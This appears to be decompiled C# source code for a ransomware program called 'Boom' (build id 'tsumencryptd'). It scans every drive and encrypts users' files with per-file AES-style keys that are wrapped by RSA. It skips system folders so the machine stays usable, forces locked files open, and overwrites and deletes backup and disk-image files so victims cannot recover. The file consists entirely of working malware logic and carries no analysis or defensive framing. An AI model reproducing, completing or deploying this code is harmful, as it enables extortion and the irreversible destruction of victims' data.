using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;

namespace Boom;

public static class Entry
{
	public static int gl_EncryptionThreadsNum = 20;

	public static int gl_SkipBlockNum = 1;

	public static long gl_MaxReadChunk = 10000000L;

	public static string gl_BuildId = "tsumencryptd";

	public static bool gl_SpeedMode = false;

	public static int gl_TasksNum = 0;

	public static Mutex gl_Mutex = null;

	public static string[] gl_ExcludedDirs = new string[29]
	{
		":\\windows", "\\program files", "\\programdata", "\\appdata\\", "system volume information", "recycle.bin", "msocache", "\\boot\\", "\\intel\\", "perflogs",
		"\\mozilla", "\\google", "\\yandex", "windows.~bt", "windows.~ws", "\\admin$", "\\c$", "\\users\\all users\\", "\\users\\public\\", "\\users\\все пользователи",
		"\\windowspowershell", "\\internet explorer", "\\edge\\", "microsoft.net", "temporary internet", ":\\winnt", "perflogs", "windows.old", "kaspersky"
	};

	public static string[] gl_ExcludedFiles = new string[50]
	{
		".themepack", ".ldf", ".scr", ".icl", ".386", ".cmd", ".ani", ".adv", ".theme", ".msi",
		".rtp", ".diagcfg", ".msstyles", ".bin", ".hlp", ".shs", ".drv", ".wpx", ".deskthemepack", ".bat",
		".rom", ".msc", ".lnk", ".cab", ".spl", ".ps1", ".msu", ".ics", ".key", ".msp",
		".com", ".sys", ".diagpkg", ".nls", ".diagcab", ".ico", ".ocx", ".mpa", ".cur", ".cpl",
		".mod", ".hta", ".exe", ".icns", ".prf", ".dll", ".nomedia", ".idx", ".ini", ".node"
	};

	public static string[] gl_WipeOut = new string[7] { ".vbm", ".vib", ".vbk", ".bkf", ".vlb", ".vlm", ".iso" };

	private static List<string> GetDrives()
	{
		List<string> list = new List<string>();
		DriveInfo[] drives = DriveInfo.GetDrives();
		for (int i = 0; i < drives.Length; i++)
		{
			list.Add(drives[i].Name);
		}
		return list;
	}

	private static bool IsExcludedFile(string file)
	{
		string[] array = gl_ExcludedFiles;
		if (array.Length == 0)
		{
			return false;
		}
		if (Array.IndexOf(array, Path.GetExtension(file)!.ToLower()) > -1)
		{
			return true;
		}
		return false;
	}

	private static bool IsExcludedDir(string directory)
	{
		string[] array = gl_ExcludedDirs;
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				if (directory.Contains(array[num].ToLower()))
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	private static void ListAllFilesRecurse(object entry)
	{
		string path = entry.ToString();
		try
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text in files)
			{
				if (!IsExcludedFile(text))
				{
					while (gl_TasksNum >= 10000)
					{
						Thread.Sleep(10);
					}
					gl_TasksNum++;
					ThreadPool.QueueUserWorkItem(EncryptWorker, text);
				}
			}
			files = Directory.GetDirectories(path);
			foreach (string text2 in files)
			{
				if (!IsExcludedDir(text2.ToLower()))
				{
					ListAllFilesRecurse(text2);
				}
			}
		}
		catch
		{
		}
	}

	private static long CalculateReadChunkSize(long fileSize)
	{
		long num = 0L;
		if (fileSize >= gl_MaxReadChunk)
		{
			return gl_MaxReadChunk;
		}
		if (fileSize <= 64L)
		{
			num = 64L;
			return 64L;
		}
		double value = fileSize / 10L;
		num = (long)Math.Round(value, 0);
		if (num <= 64L)
		{
			num = 64L;
			return 64L;
		}
		long num2 = num % 64L;
		if (num2 > 0L)
		{
			num -= num2;
		}
		return num;
	}

	private static byte[] GeneratePaddingBytes(int size)
	{
		byte[] array = new byte[size];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = 0;
		}
		return array;
	}

	private static byte[] GenerateFixedBytes(int data, int len)
	{
		string text = data.ToString();
		if (text.Length < len)
		{
			while (text.Length < len)
			{
				text = '0' + text;
			}
		}
		return Encoding.UTF8.GetBytes(text);
	}

	private static byte[] GenerateMetaData(ref byte[] securedKey, ref byte[] securedIV, long readChunkSize, int paddingBytesNum, int blocksNum, byte[] status)
	{
		string s = gl_BuildId;
		byte[] array = GenerateFixedBytes((int)readChunkSize, 8);
		byte[] array2 = GenerateFixedBytes(paddingBytesNum, 4);
		byte[] array3 = GenerateFixedBytes(blocksNum, 8);
		byte[] bytes = Encoding.UTF8.GetBytes(s);
		byte[] array4 = new byte[545];
		int num = 0;
		Array.Copy(array, 0, array4, 0, array.Length);
		num = 0 + array.Length;
		Array.Copy(array2, 0, array4, num, array2.Length);
		num += array2.Length;
		Array.Copy(securedKey, 0, array4, num, securedKey.Length);
		num += securedKey.Length;
		Array.Copy(securedIV, 0, array4, num, securedIV.Length);
		num += securedIV.Length;
		Array.Copy(array3, 0, array4, num, array3.Length);
		num += array3.Length;
		Array.Copy(status, 0, array4, num, status.Length);
		num += status.Length;
		Array.Copy(bytes, 0, array4, num, bytes.Length);
		return array4;
	}

	private static bool IsFileEncrypted(FileStream fs)
	{
		try
		{
			string text = gl_BuildId;
			byte[] array = new byte[text.Length];
			fs.Seek(text.Length * -1, SeekOrigin.End);
			fs.Read(array, 0, text.Length);
			string @string = Encoding.UTF8.GetString(array);
			fs.Seek(0L, SeekOrigin.Begin);
			return text.Equals(@string);
		}
		catch
		{
			return false;
		}
	}

	private static void UpdateBlocksNum(FileStream fs, int blocksNum)
	{
		long position = fs.Position;
		fs.Seek(-21L, SeekOrigin.End);
		byte[] array = GenerateFixedBytes(blocksNum, 8);
		fs.Write(array, 0, array.Length);
		fs.Position = position;
	}

	private static void EncryptSingleFile(string filePath, Rijndael aes, ref byte[] securedKey, ref byte[] securedIV)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}
		catch (IOException e)
		{
			int num = Marshal.GetHRForException(e) & 0xFFFF;
			if (num == 32 || num == 33)
			{
				UnlockFileRM.RMEntry(filePath);
				Thread.Sleep(2000);
				fileStream = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
			}
		}
		if (IsFileEncrypted(fileStream))
		{
			fileStream.Dispose();
			return;
		}
		int num2 = 0;
		int num3 = 0;
		long num4 = CalculateReadChunkSize(fileStream.Length + 545L);
		byte[] status = new byte[1];
		byte[] array = GenerateMetaData(ref securedKey, ref securedIV, num4, 0, 0, status);
		try
		{
			fileStream.Seek(0L, SeekOrigin.End);
			fileStream.Write(array, 0, array.Length);
			fileStream.Seek(0L, SeekOrigin.Begin);
		}
		catch
		{
			fileStream.Dispose();
			return;
		}
		byte[] array2 = new byte[num4];
		int num5 = 0;
		while (true)
		{
			byte[] encrypted = null;
			int num6 = fileStream.Read(array2, 0, (int)num4);
			if (num6 != 0)
			{
				if (num6 == (int)num4)
				{
					RijndaelWrapper.EncryptWithRijndael(aes, array2, out encrypted);
				}
				if (num6 != (int)num4)
				{
					num5 = num6;
					while (num6 % 64 != 0)
					{
						num6++;
						num2++;
					}
					if (num2 > 0)
					{
						byte[] array3 = new byte[num6];
						byte[] sourceArray = GeneratePaddingBytes(num2);
						Array.Copy(array2, 0, array3, 0, num5);
						Array.Copy(sourceArray, 0, array3, num5, num2);
						RijndaelWrapper.EncryptWithRijndael(aes, array3, out encrypted);
						num6 = num5;
					}
					else
					{
						byte[] array4 = new byte[num5];
						Array.Copy(array2, 0, array4, 0, num5);
						RijndaelWrapper.EncryptWithRijndael(aes, array4, out encrypted);
					}
				}
				if (encrypted != null && encrypted.Length > 0)
				{
					fileStream.Seek(num6 * -1, SeekOrigin.Current);
					fileStream.Write(encrypted, 0, encrypted.Length);
					num3++;
					UpdateBlocksNum(fileStream, num3);
					if (num3 == 100 && num4 == gl_MaxReadChunk)
					{
						break;
					}
				}
				if (encrypted != null && encrypted.Length > 0 && (num4 == gl_MaxReadChunk || gl_SpeedMode) && gl_SkipBlockNum > 0)
				{
					long num7 = gl_SkipBlockNum * num4;
					if (fileStream.Position + num7 < fileStream.Length)
					{
						fileStream.Seek(num7, SeekOrigin.Current);
					}
				}
				continue;
			}
			array = GenerateMetaData(ref securedKey, ref securedIV, num4, num2, num3, new byte[1] { 1 });
			fileStream.Write(array, 0, array.Length);
			break;
		}
		fileStream.Dispose();
	}

	private static bool IsWipedFile(string file)
	{
		string[] array = gl_WipeOut;
		if (array.Length == 0)
		{
			return false;
		}
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				if (file.ToLower().Contains(array[num].ToLower()))
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	private static void WipeTheFile(string filePath)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}
		catch (IOException e)
		{
			int num = Marshal.GetHRForException(e) & 0xFFFF;
			if (num == 32 || num == 33)
			{
				UnlockFileRM.RMEntry(filePath);
				Thread.Sleep(2000);
				fileStream = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
			}
		}
		long num2 = CalculateReadChunkSize(fileStream.Length);
		Random random = new Random();
		byte[] array = new byte[num2];
		random.NextBytes(array);
		int num3 = 0;
		while (fileStream.Length - fileStream.Position >= num2)
		{
			fileStream.Write(array, 0, array.Length);
			if (num2 == gl_MaxReadChunk)
			{
				long num4 = 50L * num2;
				if (fileStream.Position + num4 < fileStream.Length)
				{
					fileStream.Seek(num4, SeekOrigin.Current);
				}
			}
			num3++;
			if (num3 == 1000)
			{
				break;
			}
		}
		fileStream.Dispose();
		File.Delete(filePath);
	}

	private static void EncryptWorker(object target)
	{
		string text = target.ToString();
		if (!IsWipedFile(text))
		{
			try
			{
				Rijndael rijndael = Rijndael.Create();
				rijndael.Padding = PaddingMode.None;
				rijndael.BlockSize = 256;
				byte[] encrypted = null;
				byte[] encrypted2 = null;
				RSA.EncryptWithRSA(rijndael.Key, out encrypted);
				RSA.EncryptWithRSA(rijndael.IV, out encrypted2);
				EncryptSingleFile(text, rijndael, ref encrypted, ref encrypted2);
				rijndael.Clear();
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				WipeTheFile(text);
			}
			catch
			{
			}
		}
		gl_TasksNum--;
	}

	private static void StartListingThreads(List<string> drivesList)
	{
		Thread[] array = new Thread[drivesList.Count];
		for (int i = 0; i < drivesList.Count; i++)
		{
			Thread thread = new Thread(ListAllFilesRecurse);
			thread.Start(drivesList[i]);
			array[i] = thread;
		}
		for (int i = 0; i < array.Length; i++)
		{
			array[i].Join();
		}
		while (gl_TasksNum > 0)
		{
			Thread.Sleep(10);
		}
	}

	private static void IsInstanceRunningAlready()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		bool flag = false;
		try
		{
			gl_Mutex = Mutex.OpenExisting(gl_BuildId);
		}
		catch (WaitHandleCannotBeOpenedException)
		{
			MutexSecurity val = new MutexSecurity();
			MutexAccessRule val2 = new MutexAccessRule((IdentityReference)new SecurityIdentifier(WellKnownSidType.WorldSid, null), (MutexRights)1048577, AccessControlType.Deny);
			val.AddAccessRule(val2);
			gl_Mutex = new Mutex(true, gl_BuildId, ref flag, val);
		}
		catch (UnauthorizedAccessException)
		{
			Environment.Exit(0);
		}
	}

	public static void Main(string[] args)
	{
		ThreadPool.SetMinThreads(gl_EncryptionThreadsNum, gl_EncryptionThreadsNum);
		ThreadPool.SetMaxThreads(gl_EncryptionThreadsNum, gl_EncryptionThreadsNum);
		IsInstanceRunningAlready();
		List<string> drives = GetDrives();
		StartListingThreads(drives);
	}
}
